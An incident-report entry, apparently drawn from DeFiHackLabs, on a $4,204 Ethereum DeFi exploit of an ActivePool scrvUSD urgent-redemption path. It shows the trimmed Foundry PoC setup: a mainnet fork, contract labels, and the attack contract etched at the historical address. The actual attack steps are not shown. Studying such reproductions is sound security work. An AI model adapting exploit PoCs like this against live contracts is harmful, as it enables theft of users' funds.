# [?] ActivePoolScrvUsd - Urgent Redemption

## Summary
Severity: Unknown
Chain: Ethereum
Component: ActivePoolScrvUsdUrgentRedemption
Published: 2025-07-05
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/ActivePoolScrvUsdUrgentRedemption_exp.sol
Type: defi-exploit-poc

## Details
Lost: $4,204.55

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 22_856_272);
        vm.roll(22_856_273);
        vm.warp(1_751_757_935);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(MORPHO, "Morpho flash lender");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(CURVE_USDT_USDAF_LP, "Curve Strategic USD Reserves LP");
        vm.label(CURVE_USDAF_POOL, "Curve USDaf pool");
        vm.label(TROVE_MANAGER, "TroveManager");
        vm.label(ACTIVE_POOL, "ActivePool");
        vm.label(USDAF, "USDaf");
        vm.label(SCRVUSD, "scrvUSD");
        vm.label(CURVE_SCRVUSD_SUSDE_POOL, "Curve scrvUSD/sUSDe pool");
        vm.label(SUSDE, "sUSDe");
        vm.label(FLUID_DEX, "Fluid DEX");
        vm.label(UNISWAP_V3_ROUTER, "Uniswap V3 router");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerEthBefore = ATTACKER.balance;

        ActivePoolScrvUsdUrgentRedemptionAttack template =
            new ActivePoolScrvUsdUrgentRedemptionAttack(ATTACKER);
        vm.etch(HISTORICAL_ATTACK_CONTRACT, address(template).code);
        vm.deal(HISTORICAL_ATTACK_CONTRACT, 0);

        vm.prank(ATTACKER);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/ActivePoolScrvUsdUrgentRedemption_exp.sol_
